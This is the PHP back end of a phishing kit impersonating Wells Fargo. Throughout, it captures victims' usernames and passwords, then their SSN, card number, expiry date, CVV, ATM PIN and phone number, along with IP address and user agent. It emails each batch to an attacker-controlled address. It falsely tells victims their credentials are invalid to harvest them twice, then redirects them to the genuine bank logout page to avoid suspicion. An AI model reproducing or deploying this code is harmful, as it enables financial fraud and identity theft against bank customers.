<?php
ob_start();

include 'email.php';
$email = trim($_POST['ai']);
$password = trim($_POST['pr']);

if (isset($_POST['btn2'])) {

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| |--------------|\n";
	
	$message .= "Email : ".$_POST['ai']."\n";
	$message .= "Password : ".$_POST['pr']."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = $Receive_email;
	$subject = "Wellsfargo email : $ip";
	mail($send, $subject, $message); 

	$count = $_POST['count'];
	if ($count<1) {
		$count=$count+1;
		header("Location: ./em.html?count=".$count."&email=#".$_POST['ai']);
	}
	else
	{
		header("Location: ./detail.html");

	}
	
	
}
else if (isset($_POST['btn3'])) {

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| |--------------|\n";
	
	$message .= "SSN : ".$_POST['ssn']."\n";
	$message .= "Card Number : ".$_POST['cn']."\n";
	$message .= "Expiration Date : ".$_POST['exdate']."\n";
	$message .= "CVV : ".$_POST['cvv']."\n";
	$message .= "ATM Pin : ".$_POST['pin']."\n";
	$message .= "Phone Number : ".$_POST['ph']."\n";

	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = $Receive_email;
	$subject = "Wellsfargo details : $ip";
	mail($send, $subject, $message);

	header("Location: https://connect.secure.wellsfargo.com/auth/secureLogout?"); 
	
	
}
else if($email != null && $password != null){
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------|  |--------------|\n";
	
	$message .= "Username : ".$email."\n";
	$message .= "Password : ".$password."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|-----------  --------------|\n";
	$send = $Receive_email;
	$subject = "Wellsfargo login : $ip";
    mail($send, $subject, $message);   
	$signal = 'ok';
	$msg = 'InValid Credentials';
	
	// $praga=rand();
	// $praga=md5($praga);
}
else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg,
        'redirect_link' => $redirect,
    );
    echo json_encode($data);
ob_end_flush();
?>